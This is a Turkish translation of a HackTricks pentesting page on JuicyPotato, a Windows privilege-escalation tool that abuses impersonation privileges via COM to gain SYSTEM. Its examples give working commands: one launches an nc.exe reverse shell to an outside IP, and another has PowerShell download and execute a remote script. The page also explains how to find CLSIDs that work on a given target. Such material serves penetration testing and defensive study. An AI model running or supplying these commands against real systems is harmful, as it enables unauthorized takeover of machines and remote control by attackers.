# JuicyPotato

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

* **Bir **cybersecurity şirketinde mi çalışıyorsunuz? Şirketinizin **HackTricks'te reklamını görmek** ister misiniz? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo'ya**](https://github.com/carlospolop/hacktricks-cloud) **PR göndererek paylaşın.**

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) **dark-web** destekli bir arama motorudur ve şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini kontrol etmek için ücretsiz** işlevsellikler sunar.

WhiteIntel'in başlıca amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**JuicyPotato**, Windows Server 2019 ve Windows 10 sürümü 1809'dan sonrasında çalışmaz. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) aynı ayrıcalıkları kullanmak ve `NT AUTHORITY\SYSTEM` seviyesine erişmek için kullanılabilir. _**Kontrol edin:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (altın ayrıcalıklarını kötüye kullanma) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Biraz meyve suyu eklenmiş_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_nun şekerlenmiş versiyonu, yani **Windows Hizmet Hesaplarından NT AUTHORITY\SYSTEM'e** **başka bir Yerel Ayrıcalık Yükseltme aracı**_

#### Juicypotato'yı [buradan indirebilirsiniz](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Özet <a href="#summary" id="summary"></a>

[**Juicy-potato Readme'den**](https://github.com/ohpe/juicy-potato/blob/master/README.md)** alınmıştır:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) ve [varyantları](https://github.com/decoder-it/lonelypotato) [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisine](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) dayalı ayrıcalık yükseltme zincirini kullanan ve `127.0.0.1:6666` üzerinde MiTM dinleyicisi olan ve `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına sahip olduğunuzda çalışan bir yapıya sahiptir. Bir Windows derlemesi incelemesi sırasında, `BITS`'in kasıtlı olarak devre dışı bırakıldığı ve port `6666`'nın alındığı bir yapı bulduk.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi silahlandırmaya karar verdik: **Juicy Potato'ya hoş geldiniz**.

> Teori için [Rotten Potato - Hizmet Hesaplarından SYSTEM'e Ayrıcalık Yükseltme](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) ve bağlantılar ve referanslar zincirini takip edin.

`BITS` dışında, kötüye kullanabileceğimiz birkaç COM sunucusu olduğunu keşfettik. Bunlar sadece:

1. mevcut kullanıcı tarafından anında oluşturulabilir, genellikle bir "hizmet kullanıcısı" olup kimlik hırsızlığı ayrıcalıklarına sahiptir
2. `IMarshal` arabirimini uygular
3. yükseltilmiş bir kullanıcı olarak çalışır (SYSTEM, Yönetici, …)

Biraz testten sonra, çeşitli Windows sürümlerinde [ilginç CLSID'lerin](http://ohpe.it/juicy-potato/CLSID/) kapsamlı bir listesini elde ettik ve test ettik.

### Juicy detaylar <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato size şunları yapmanızı sağlar:

* **Hedef CLSID** _istediğiniz herhangi bir CLSID'yi seçin._ [_Buradan_](http://ohpe.it/juicy-potato/CLSID/) _işletim sistemine göre düzenlenmiş listeyi bulabilirsiniz._
* **COM Dinleme portu** _sabitlenmiş 6666 yerine tercih ettiğiniz COM dinleme portunu tanımlayın_
* **COM Dinleme IP adresi** _sunucuyu herhangi bir IP'ye bağlayın_
* **İşlem oluşturma modu** _kimlik hırsızlığı yapan kullanıcının ayrıcalıklarına bağlı olarak seçebileceğiniz:_
* `CreateProcessWithToken` (`SeImpersonate` gerektirir)
* `CreateProcessAsUser` (`SeAssignPrimaryToken` gerektirir)
* `her ikisi`
* **Başlatılacak işlem** _saldırı başarılı olursa bir yürütülebilir dosya veya betik başlatın_
* **İşlem Argümanı** _başlatılan işlem argümanlarını özelleştirin_
* **RPC Sunucu adresi** _gizli bir yaklaşım için harici bir RPC sunucusuna kimlik doğrulayabilirsiniz_
* **RPC Sunucu portu** _eğer bir güvenlik duvarı port `135`'i engelliyorsa harici bir sunucuya kimlik doğrulamak istiyorsanız faydalı olabilir…_
* **TEST modu** _genellikle test amaçlıdır, yani CLSID'leri test etmek için. DCOM oluşturur ve token kullanıcısını yazdırır. Test etmek için_ [_buraya bakın_](http://ohpe.it/juicy-potato/Test/)
### Kullanım <a href="#kullanım" id="kullanım"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Son düşünceler <a href="#final-thoughts" id="final-thoughts"></a>

[**Juicy Potato Readme'den**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Kullanıcı `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına sahipse, o zaman **SYSTEM**'dir.

Tüm bu COM Sunucularının kötüye kullanımını engellemek neredeyse imkansızdır. Bu nesnelerin izinlerini `DCOMCNFG` aracılığıyla değiştirmeyi düşünebilirsiniz ancak başarılar, bu oldukça zor olacaktır.

Gerçek çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak kesinlikle bu saldırıyı engelleyecektir ancak altta yatan işletim sistemi üzerinde ciddi bir etkiye sahip olabilir.

Kaynak: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Örnekler

Not: Denemek için CLSID'lerin bir listesi için [bu sayfayı](https://ohpe.it/juicy-potato/CLSID/) ziyaret edin.

### Bir nc.exe ters kabuk alın
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell tersine
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Yeni bir CMD başlatın (RDP erişiminiz varsa)

![](<../../.gitbook/assets/image (297).png>)

## CLSID Sorunları

Genellikle, JuicyPotato'nun kullandığı varsayılan CLSID **çalışmaz** ve güvenlik açığı başarısız olur. Genellikle, **çalışan bir CLSID** bulmak için birden fazla deneme yapmak gerekir. Belirli bir işletim sistemi için denemek için bir CLSID listesi almak için şu sayfayı ziyaret etmelisiniz:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSİD'leri Kontrol Etme**

İlk olarak, juicypotato.exe dışında bazı yürütülebilir dosyalara ihtiyacınız olacak.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) dosyasını indirin ve PS oturumunuza yükleyin, ardından [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) dosyasını indirin ve yürütün. Bu betik, test etmek için olası CLSID'lerin bir listesini oluşturacaktır.

Daha sonra [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSID listesi ve juicypotato yürütülebilir dosyasının yolunu değiştirin) dosyasını indirin ve yürütün. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde, bu CLSID'nin çalıştığı anlamına gelecektir**.

**Çalışan CLSID'leri** -c parametresini kullanarak **kontrol edin**

## Referanslar

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için ücretsiz işlevsellikler sunan **karanlık ağ** destekli bir arama motorudur.

WhiteIntel'in asıl amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve **ücretsiz** olarak motorlarını deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizi HackTricks'te reklamını görmek ister misiniz? veya PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **💬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya beni Twitter'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Hacking püf noktalarınızı göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **üzerinden PR'lar gönderin.**

</details>
